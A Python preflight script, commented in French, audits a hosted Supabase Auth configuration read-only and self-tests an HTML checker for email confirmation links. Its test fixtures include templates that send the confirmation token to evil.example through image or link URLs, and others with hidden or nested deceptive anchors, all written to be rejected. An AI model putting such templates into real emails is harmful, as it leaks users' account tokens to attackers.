#!/usr/bin/env python3
"""Lecture seule des réglages Auth hébergés; aucune sortie de secret ni modèle."""
import argparse
import json
import os
import re
from pathlib import Path
from html.parser import HTMLParser
from urllib.parse import parse_qsl, urlsplit
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

PROJECT="gpvivleexywljowcqkru"
SITE="https://www.benoitcantin.com"
CONFIRM=SITE+"/compte/confirmer.html"
API="https://api.supabase.com/v1/projects/"+PROJECT+"/config/auth"
WORKFLOW=Path(__file__).resolve().parents[1]/".github/workflows/sinjira-auth-email-production-preflight.yml"


class ConfirmationLinkParser(HTMLParser):
    """Inspecter les vrais href HTML, jamais les commentaires ni le texte brut."""

    # Éléments sans fermeture : ils ne modifient pas l'héritage de visibilité.
    VOID_TAGS = frozenset(("area", "base", "br", "col", "embed", "hr",
                           "img", "input", "link", "meta", "param",
                           "source", "track", "wbr"))

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.valid_link = False
        # HTML5 referme implicitement une ancre avant une ancre imbriquée.
        # HTMLParser ne reproduit pas cette réparation du DOM : refuser
        # les modèles ambigus plutôt que certifier un faux lien cliquable.
        self.invalid_anchor_markup = False
        self.visibility_stack = []
        # Un <a href> valide n'est pas utilisable si son contenu est vide.
        # On ne valide l'ancre qu'à sa fermeture, après contrôle du libellé.
        self.pending_links = []

    def handle_starttag(self, tag, attrs):
        if tag == "a" and any(name == "a" for name, _ in self.visibility_stack):
            self.invalid_anchor_markup = True
        properties = dict(attrs)
        style = str(properties.get("style") or "")
        # Un href correct mais dans un bloc invisible ne doit pas être
        # considéré comme un bouton de confirmation utilisable.
        local_hidden = (
            tag in ("template", "head", "script", "style",
                    "textarea", "select", "option", "noscript")
            or "hidden" in properties
            or "inert" in properties
            or str(properties.get("aria-hidden") or "").strip().lower() == "true"
            or bool(re.search(r"(?:^|;)\s*(?:display\s*:\s*none|visibility\s*:\s*hidden)\b",
                              style, re.IGNORECASE))
        )
        inherited_hidden = self.visibility_stack[-1][1] if self.visibility_stack else False
        hidden = local_hidden or inherited_hidden
        if tag not in self.VOID_TAGS:
            self.visibility_stack.append((tag, hidden))
        if tag == "img" and not hidden and self.pending_links:
            # Image cliquable : exiger une source et un texte alternatif.
            # Un <img> décoratif ne remplace pas un libellé de confirmation.
            if (str(properties.get("src") or "").strip() and
                    str(properties.get("alt") or "").strip()):
                self.pending_links[-1]["has_label"] = True
        if tag != "a" or hidden:
            return
        # Deux attributs href sont ambigus : les navigateurs peuvent choisir
        # différemment la destination. On refuse ce modèle sans le certifier.
        hrefs = [value for name, value in attrs if name == "href"]
        if len(hrefs) != 1 or not isinstance(hrefs[0], str):
            return
        parts = urlsplit(hrefs[0])
        if (parts.scheme + "://" + parts.netloc + parts.path != CONFIRM
                or parts.query or parts.username or parts.password):
            return
        # HTMLParser décode &amp; en &, puis on vérifie les deux paramètres
        # du fragment sans accepter de doublons ou de valeur étrangère.
        pairs = parse_qsl(parts.fragment, keep_blank_values=True)
        if (len(pairs) == 2 and
                dict(pairs) == {"token_hash": "{{ .TokenHash }}",
                              "type": "email"}):
            self.pending_links.append({
                "depth": len(self.visibility_stack), "has_label": False
            })

    def handle_data(self, data):
        if (self.pending_links and self.visibility_stack and
                not self.visibility_stack[-1][1] and data.strip()):
            self.pending_links[-1]["has_label"] = True

    def handle_endtag(self, tag):
        if tag == "a" and self.pending_links:
            current = self.pending_links[-1]
            if current["depth"] == len(self.visibility_stack):
                self.pending_links.pop()
                if current["has_label"]:
                    self.valid_link = True
        # Empiler/dépiler les ancêtres permet de rejeter les liens cachés
        # sans rejeter un lien visible situé après le bloc masqué.
        for index in range(len(self.visibility_stack) - 1, -1, -1):
            if self.visibility_stack[index][0] == tag:
                del self.visibility_stack[index:]
                break

    def handle_startendtag(self, tag, attrs):
        # Un <a ... /> sans contenu n'est pas un lien cliquable.
        if tag == "a":
            # <a /> n'est pas une ancre autofermante HTML valide.
            self.invalid_anchor_markup = True
            return
        self.handle_starttag(tag, attrs)
        if tag not in self.VOID_TAGS:
            self.handle_endtag(tag)


def has_secure_confirmation_link(content):
    if not isinstance(content, str):
        return False
    # Un seul jeton dans le modèle, réservé au href de confirmation.
    # Sinon un bon lien peut masquer une fuite vers une image, un deuxième
    # lien, un commentaire ou un texte qui révèle le jeton du destinataire.
    # Inclut les variantes Go Template avec espaces ou pipeline.
    token_references = [
        placeholder for placeholder in re.findall(r"\{\{[^{}]*\}\}", content)
        if re.search(r"\.(?:TokenHash|Token|ConfirmationURL)\b", placeholder)
    ]
    if token_references != ["{{ .TokenHash }}"]:
        return False
    try:
        parser = ConfirmationLinkParser()
        parser.feed(content)
        parser.close()
        return parser.valid_link and not parser.invalid_anchor_markup
    except ValueError:
        return False


def audit(config):
    passed,failed,warnings=[],[],[]
    def check(label,valid):
        (passed if valid else failed).append(label)
    if not isinstance(config,dict):
        return [],["Configuration Auth non reconnue"],[]
    check("Site URL",isinstance(config.get("site_url"),str) and config["site_url"].rstrip("/")==SITE)
    check("Inscription ouverte",config.get("disable_signup") is False)
    check("Courriel activé",config.get("external_email_enabled") is True)
    check("Confirmation requise",config.get("mailer_autoconfirm") is False)
    allowed=config.get("uri_allow_list")
    urls={s.strip().rstrip("/") for s in allowed.split(",")} if isinstance(allowed,str) else set()
    check("URL de retour permise",bool(urls & {CONFIRM,SITE+"/**"}))
    content=config.get("mailer_templates_confirmation_content")
    check("Modèle sécurisé par fragment",has_secure_confirmation_link(content))
    subject=config.get("mailer_subjects_confirmation")
    check("Objet de confirmation défini",isinstance(subject,str) and bool(subject.strip()))
    check("MFA TOTP disponible",config.get("mfa_totp_enroll_enabled") is True and
          config.get("mfa_totp_verify_enabled") is True)
    minlength=config.get("password_min_length")
    check("Longueur minimale douze",type(minlength) is int and minlength>=12)
    # Ces paramètres existent dans GET /config/auth. Leur présence ne valide ni
    # les secrets SMTP masqués par l'API ni la livraison des messages.
    smtp_host=config.get("smtp_host")
    check("Serveur SMTP personnalisé renseigné",
          isinstance(smtp_host,str) and bool(smtp_host.strip()) and
          smtp_host.strip().lower() not in ("localhost","127.0.0.1","0.0.0.0","::1"))
    smtp_port=config.get("smtp_port")
    port_text=str(smtp_port).strip() if type(smtp_port) in (int,str) else ""
    check("Port SMTP valide",port_text.isdecimal() and 1<=int(port_text)<=65535)
    sender=config.get("smtp_admin_email")
    check("Adresse expéditrice SMTP valide",
          isinstance(sender,str) and 0<len(sender)<=254 and
          sender.count("@")==1 and "." in sender.rsplit("@",1)[-1] and
          not any(c.isspace() for c in sender))
    smtp_user=config.get("smtp_user")
    check("Identifiant SMTP renseigné",isinstance(smtp_user,str) and bool(smtp_user.strip()))
    warnings.append("SMTP : secret et livraison réelle non vérifiables par ce prévol")
    if config.get("password_hibp_enabled") is not True:
        warnings.append("Protection HIBP absente ou non vérifiée; offre Supabase à confirmer")
    return passed,failed,warnings


def selftest():
    workflow=WORKFLOW.read_text(encoding="utf-8")
    assert "environment: production" in workflow
    assert "workflow_dispatch:" in workflow
    assert "PREFLIGHT-READ-ONLY" in workflow
    assert "secrets.SUPABASE_ACCESS_TOKEN" in workflow
    # Aucun téléchargement tiers de Python: le runner Ubuntu 24.04 fournit
    # Python 3.12, validé avant l'auto-test et avant la lecture privée.
    assert "actions/setup-python@" not in workflow
    assert workflow.count("python3 -c 'import sys; assert sys.version_info[:2] == (3, 12)") == 2
    assert workflow.count("environment: production") == 1
    assert workflow.count("github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'") == 1
    assert workflow.count("secrets.SUPABASE_ACCESS_TOKEN") == 1
    assert workflow.count("python3 scripts/preflight_sinjira_auth_email.py --remote") == 1
    for illegal in ("--request PATCH","--request POST","--request DELETE","--request PUT","supabase db"):
        assert illegal not in workflow,"Méthode mutante interdite"
    good={"site_url":SITE,"disable_signup":False,"external_email_enabled":True,
          "mailer_autoconfirm":False,"uri_allow_list":CONFIRM,
          "mailer_templates_confirmation_content":
              '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a>',
          "mailer_subjects_confirmation":"Confirmez votre compte",
          "mfa_totp_enroll_enabled":True,"mfa_totp_verify_enabled":True,
          "password_min_length":12,"password_hibp_enabled":False,
          "smtp_host":"smtp.example.org","smtp_port":"587",
          "smtp_admin_email":"no-reply@example.org","smtp_user":"smtp-account"}
    ok,bad,warn=audit(good)
    assert len(ok)==13 and not bad and len(warn)==2
    mutations=[
        ({"site_url":"https://invalid.example"},"Site URL"),
        ({"disable_signup":True},"Inscription ouverte"),
        ({"mailer_autoconfirm":True},"Confirmation requise"),
        ({"uri_allow_list":SITE+"/profile"},"URL de retour permise"),
        ({"mailer_templates_confirmation_content":'<a href="{{ .ConfirmationURL }}">Cliquez</a>'},"Modèle sécurisé par fragment"),
        ({"mailer_subjects_confirmation":""},"Objet de confirmation défini"),
        ({"mfa_totp_verify_enabled":False},"MFA TOTP disponible"),
        ({"password_min_length":8},"Longueur minimale douze"),
        ({"external_email_enabled":False},"Courriel activé"),
        ({"smtp_host":""},"Serveur SMTP personnalisé renseigné"),
        ({"smtp_host":"127.0.0.1"},"Serveur SMTP personnalisé renseigné"),
        ({"smtp_port":"not-a-port"},"Port SMTP valide"),
        ({"smtp_port":"0"},"Port SMTP valide"),
        ({"smtp_admin_email":"not-an-email"},"Adresse expéditrice SMTP valide"),
        ({"smtp_user":""},"Identifiant SMTP renseigné"),
    ]
    for update,label in mutations:
        _,failed,_=audit({**good,**update})
        assert label in failed,"Régression non détectée : "+label
    assert len(audit({})[1])==13
    assert not audit({**good,"uri_allow_list":SITE+"/**"})[1]
    # Une mention textuelle n'est pas un vrai lien de confirmation.
    # Le paramètre type=email doit appartenir au MÊME href que token_hash.
    deceptive_templates = [
        CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email",
        "<!-- <a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email'> -->",
        "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}'>Confirmer</a> type=email",
        "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=recovery'>type=email</a>",
        "<a href='https://evil.example/compte/confirmer.html#token_hash={{ .TokenHash }}&amp;type=email'>Confirmer</a>",
        "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email&amp;type=email'>Confirmer</a>",
        "<a href='https://evil.example/' href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email'>Confirmer</a>",
        "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&amp;type=email' href='https://evil.example/'>Confirmer</a>",
    ]
    # Un bon lien ne compense pas la divulgation du même jeton ailleurs.
    # Un logo/external footer sans jeton reste permis.
    safe = good["mailer_templates_confirmation_content"]
    leaked_templates = [
        safe + "<img src='https://evil.example/collect?token={{ .TokenHash }}'>",
        safe + "<a href='https://evil.example/?token={{ .TokenHash }}'>Aide</a>",
        safe + "<!-- le jeton : {{ .TokenHash }} -->",
        safe + "<p>Copie du jeton : {{ .TokenHash }}</p>",
        safe + safe,
        safe + "<img src='https://evil.example/collect?token={{.TokenHash}}'>",
        safe + "<img src='https://evil.example/collect?token={{ .TokenHash | urlquery }}'>",
        safe + "<a href='https://evil.example/?token={{ .Token }}'>Code</a>",
        safe + "<a href='{{ .ConfirmationURL }}'>Autre lien</a>",
        safe + "<img src='https://evil.example/collect?token={{ printf \"%s\" .TokenHash }}'>",
        safe + "<p>{{- .TokenHash -}}</p>",
    ]
    deceptive_templates.extend(leaked_templates)
    # Régression : la destination est correcte mais le vrai lien de
    # confirmation ne peut pas être vu/activé par le destinataire.
    hidden_templates = [
        '<a hidden href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a>',
        '<a aria-hidden="true" href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a>',
        '<a style="display:none" href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a>',
        '<a style="DISPLAY : None !important" href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a>',
        '<div hidden><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></div>',
        '<section style="visibility:hidden"><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></section>',
        '<template><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></template>',
        '<div inert><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></div>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email" />',
    ]
    deceptive_templates.extend(hidden_templates)
    # Le href exact ne suffit pas si le destinataire n'a rien à cliquer.
    # Le prévol doit également accepter un vrai libellé ou une image avec alt.
    empty_link_templates = [
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">  </a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><!-- Confirmer --></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><span hidden>Confirmer</span></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><img src="image.png" alt=""></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><img alt="Confirmer"></a>',
    ]
    deceptive_templates.extend(empty_link_templates)
    # Un parseur HTML5 ferme implicitement le premier <a> avant un <a>
    # imbriqué. Un parseur permissif peut sinon valider une ancre sans texte
    # ou un lien trompeur qui n'est pas celui cliqué dans le navigateur.
    nested_anchor_templates = [
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><a href="https://evil.example/">Confirmer</a></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer <a href="https://evil.example/">ici</a></a>',
        '<a href="https://evil.example/">Aide <a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></a>',
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer <a href="https://evil.example/" /></a>',
    ]
    deceptive_templates.extend(nested_anchor_templates)
    # Le navigateur traite le HTML de <textarea> comme du texte, et les
    # ancres dans <select>/<option> ou <noscript> ne constituent pas des
    # commandes fiables. Ne jamais certifier un faux bouton masqué.
    inert_container_templates = [
        '<textarea><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></textarea>',
        '<select><option><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></option></select>',
        '<noscript><a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email">Confirmer</a></noscript>',
    ]
    deceptive_templates.extend(inert_container_templates)
    for template in deceptive_templates:
        _, failed, _ = audit({**good, "mailer_templates_confirmation_content": template})
        assert "Modèle sécurisé par fragment" in failed, "Faux positif du modèle de courriel"
    assert has_secure_confirmation_link(
        "<a href='"+CONFIRM+"#token_hash={{ .TokenHash }}&type=email'>Confirmer</a>")
    assert has_secure_confirmation_link(
        good["mailer_templates_confirmation_content"] +
        "<a href='https://www.benoitcantin.com/'>Accueil sans jeton</a>")
    assert has_secure_confirmation_link(
        "<div hidden><p>Contenu auxiliaire masqué</p></div>" +
        good["mailer_templates_confirmation_content"])
    assert has_secure_confirmation_link(
        "<template><a href='https://example.invalid/'>Ignoré</a></template>" +
        good["mailer_templates_confirmation_content"])
    assert has_secure_confirmation_link(
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><strong>Confirmer mon compte</strong></a>')
    assert has_secure_confirmation_link(
        '<a href="'+CONFIRM+'#token_hash={{ .TokenHash }}&amp;type=email"><img src="image.png" alt="Confirmer mon compte"></a>')
    assert has_secure_confirmation_link(
        "<span style='display:none'/>" + good["mailer_templates_confirmation_content"])
    print("OK prévol Auth : treize contrats, quinze régressions, "
          f"{len(deceptive_templates)} modèles trompeurs (dont ancres imbriquées) et wildcard testés.")


def remote():
    token=os.environ.get("SUPABASE_ACCESS_TOKEN","").strip()
    if not token:
        print("ÉCHEC : accès Management API réservé à l'environnement production")
        return 2
    request=Request(API,headers={"Authorization":"Bearer "+token,
                                "Accept":"application/json"},method="GET")
    try:
        with urlopen(request,timeout=18) as response:
            if response.status!=200:
                raise ValueError()
            raw=response.read(5_000_001)
        if len(raw)>5_000_000:
            raise ValueError()
        config=json.loads(raw)
    except (HTTPError,URLError,OSError,TimeoutError,ValueError):
        print("ÉCHEC : lecture Auth impossible (aucune donnée privée affichée)")
        return 2
    passed,failed,warnings=audit(config)
    for value in passed:
        print("PASS :",value)
    for value in failed:
        print("ÉCHEC :",value)
    for value in warnings:
        print("AVERTISSEMENT :",value)
    print("BILAN :",len(passed),"OK,",len(failed),"à corriger,",len(warnings),"avertissement(s)")
    print("Pas de changement de configuration ni de preuve de livraison de courriel.")
    return 1 if failed else 0


if __name__=="__main__":
    parser=argparse.ArgumentParser()
    mode=parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--self-test",action="store_true")
    mode.add_argument("--remote",action="store_true")
    args=parser.parse_args()
    if args.self_test:
        selftest()
        raise SystemExit(0)
    raise SystemExit(remote())
